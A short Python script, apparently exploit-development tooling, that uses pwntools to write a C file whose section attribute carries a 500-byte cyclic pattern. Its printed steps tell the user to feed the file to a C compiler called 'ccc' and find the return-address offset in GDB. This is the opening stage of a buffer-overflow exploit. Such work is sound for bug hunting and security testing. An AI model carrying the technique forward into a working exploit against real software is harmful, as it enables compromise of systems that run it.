#!/usr/bin/env python3
from pwn import *

# Generate 500-byte cyclic pattern
pattern = cyclic(500)

# Convert to C hex escapes
c_hex = ''.join(f'\\x{b:02x}' for b in pattern)

source = f'''#include <stdio.h>

__attribute__((section("{c_hex}")))
void foo() {{}}

int main(void) {{
    return 0;
}}
'''

with open("cyclic.c", "w") as f:
    f.write(source)

print("[*] Created cyclic.c with 500-byte cyclic pattern")
print("[*] Run: ./target/release/ccc cyclic.c")
print("[*] In GDB, get RIP value, then:")
print("    python3 -c \"from pwn import *; print(cyclic_find(<rip_value>, n=8))\"")
